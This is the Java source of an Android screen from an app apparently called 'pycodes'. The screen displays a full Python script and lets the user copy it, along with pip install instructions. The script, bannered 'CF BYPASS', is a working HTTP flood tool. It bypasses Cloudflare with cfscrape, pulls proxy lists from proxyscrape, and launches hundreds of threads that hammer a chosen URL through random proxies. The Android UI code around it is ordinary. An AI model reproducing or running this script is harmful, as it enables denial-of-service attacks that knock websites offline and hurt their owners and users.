package com.zhirrrstudio.pycodes;

import androidx.appcompat.app.AppCompatActivity;
import android.app.*;
import android.os.*;
import android.view.*;
import android.view.View.*;
import android.widget.*;
import android.content.*;
import android.graphics.*;
import android.media.*;
import android.net.*;
import android.text.*;
import android.util.*;
import android.webkit.*;
import android.animation.*;
import android.view.animation.*;
import java.util.*;
import java.text.*;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.view.View;
import android.content.ClipData;
import android.content.ClipboardManager;

public class FourActivity extends AppCompatActivity {
	
	
	private LinearLayout bg2;
	private LinearLayout linear4;
	private TextView t1;
	private LinearLayout linear2;
	private TextView b1;
	private TextView textview1;
	private TextView textview10;
	private LinearLayout linear5;
	private TextView textview11;
	private TextView textview12;
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.four);
		initialize(_savedInstanceState);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
		
		bg2 = (LinearLayout) findViewById(R.id.bg2);
		linear4 = (LinearLayout) findViewById(R.id.linear4);
		t1 = (TextView) findViewById(R.id.t1);
		linear2 = (LinearLayout) findViewById(R.id.linear2);
		b1 = (TextView) findViewById(R.id.b1);
		textview1 = (TextView) findViewById(R.id.textview1);
		textview10 = (TextView) findViewById(R.id.textview10);
		linear5 = (LinearLayout) findViewById(R.id.linear5);
		textview11 = (TextView) findViewById(R.id.textview11);
		textview12 = (TextView) findViewById(R.id.textview12);
		
		b1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				if (textview1.getText().toString().trim().equals("")) {
					SketchwareUtil.showMessage(getApplicationContext(), "Empty");
				}
				else {
					((ClipboardManager) getSystemService(getApplicationContext().CLIPBOARD_SERVICE)).setPrimaryClip(ClipData.newPlainText("clipboard", textview1.getText().toString().trim()));
					SketchwareUtil.showMessage(getApplicationContext(), "Copy");
				}
			}
		});
		
		textview11.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				if (textview12.getText().toString().trim().equals("")) {
					SketchwareUtil.showMessage(getApplicationContext(), "Empty");
				}
				else {
					((ClipboardManager) getSystemService(getApplicationContext().CLIPBOARD_SERVICE)).setPrimaryClip(ClipData.newPlainText("clipboard", textview12.getText().toString().trim()));
					SketchwareUtil.showMessage(getApplicationContext(), "Copy");
				}
			}
		});
	}
	private void initializeLogic() {
		textview1.setText("import cfscrape\nimport os\nimport random\nimport time\nimport requests\nimport threading\nfrom colorama import Fore\nprint(Fore.YELLOW + \"\"\"  \n  ____ _____   ______   ______   _    ____ ____\n / ___|  ___| | __ ) \\ / /  _ \\ / \\  / ___/ ___|\n| |   | |_    |  _ \\\\  V /| |_) / _ \\ \\___ \\___ \\ \\r\n| |___|  _|   | |_) || | |  __/ ___ \\ ___) |__) |\n \\____|_|     |____/ |_| |_| /_/   \\_\\____/____/\n\"\"\")\nprint(\"Coded By Zhirrr\")\n\ndef opth():\n	for a in range(thr):\n		x = threading.Thread(target=atk)\n		x.start()\n		print(\"Threads \" + str(a+1) + \" Created \")\n	print(Fore.RED + \"Wait A Few Seconds For Threads Ready To Attack ...\")\n	time.sleep(10)\n	input(Fore.CYAN + \"Press Enter To Launch Attack !\")\n	global oo\n	oo = True\n\noo = False\ndef main():\n	global url\n	global list\n	global pprr\n	global thr\n	global per\n	url = str(input(Fore.GREEN + \"Url : \" + Fore.WHITE))\n	ssl = str(input(Fore.GREEN + \"Enable SSL Mode ? (y/n) : \" + Fore.WHITE))\n	ge = str(input(Fore.GREEN + \"Get New Proxies List ? (y/n) : \" + Fore.WHITE))\n	if ge =='y':\n		if ssl == 'y':\n			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000') #Coded By Zhirrr\n			with open('proxies.txt','wb') as fp:\n				fp.write(rsp.content)\n				print(Fore.CYAN + \"Sucess Get Https Proxies List !\")\n		else:\n			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') #Coded By Zhirrr\n			with open('proxies.txt','wb') as fp:\n				fp.write(rsp.content)\n				print(Fore.CYAN + \"Sucess Get Http Proxies List !\")\n	else:\n		pass\n	list = str(input(Fore.GREEN + \"List (proxies.txt) : \" + Fore.WHITE))\n	pprr = open(list).readlines()\n	print(Fore.GREEN + \"Proxies Count : \" + Fore.WHITE + \"%d\" %len(pprr))\n	thr = int(input(Fore.GREEN + \"Threads (1-400 Default Is 300) : \" + Fore.WHITE))\n	per = int(input(Fore.GREEN + \"CC.Power (1-100 Default Is 70) : \" + Fore.WHITE))\n	opth()\n\ndef atk():\n	pprr = open(list).readlines()\n	proxy = random.choice(pprr).strip().split(\":\")\n	s = cfscrape.create_scraper()\n	s.proxies = {}\n	s.proxies['http'] = 'http://'+str(proxy[0])+\":\"+str(proxy[1])\n	s.proxies['https'] = 'https://'+str(proxy[0])+\":\"+str(proxy[1])\n	time.sleep(5)\n	while True:\n		while oo:\n			try:\n				s.get(url)\n				print(Fore.CYAN + \"Bypass -> \" + Fore.WHITE + str(url)+ Fore.CYAN + \" From~# \" +Fore.WHITE+ str(proxy[0])+\":\"+str(proxy[1]))\n				try:\n					for g in range(per):\n						s.get(url)\n						print(Fore.CYAN + \"Bypass -> \" + Fore.WHITE + str(url)+Fore.CYAN + \" From~# \" +Fore.WHITE + str(proxy[0])+\":\"+str(proxy[1])) #coded By Zhirrr\n					s.close()\n				except:\n					s.close()\n			except:\n				s.close()\n				print(Fore.RED + \"Can't Connect To Proxies Or Url !\")\n\n\nif __name__ == \"__main__\":\n	main()");
		textview12.setText("pip install cfscrape\npip install os\npip install random\npip install time\npip install requests\npip install threading\npip install colorama");
		_gd(linear2, "#000000", "#000000", 30);
		_gd(linear5, "#000000", "#000000", 30);
		_shadow(linear2, 15);
		_shadow(linear5, 15);
	}
	
	@Override
	protected void onActivityResult(int _requestCode, int _resultCode, Intent _data) {
		super.onActivityResult(_requestCode, _resultCode, _data);
		
		switch (_requestCode) {
			
			default:
			break;
		}
	}
	
	private void _gd (final View _view, final String _c, final String _sc, final double _r) {
		android.graphics.drawable.GradientDrawable gd = new android.graphics.drawable.GradientDrawable();
		
		gd.setColor(Color.parseColor(_c));
		gd.setCornerRadius((float)_r);
		gd.setStroke(2, Color.parseColor(_sc));
		
		_view.setBackground(gd);
	}
	
	
	private void _shadow (final View _view, final double _bayangan) {
		android.graphics.drawable.GradientDrawable round = new android.graphics.drawable.GradientDrawable(); _view.setElevation((int)_bayangan);
	}
	
	
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input){
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels(){
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels(){
		return getResources().getDisplayMetrics().heightPixels;
	}
	
}
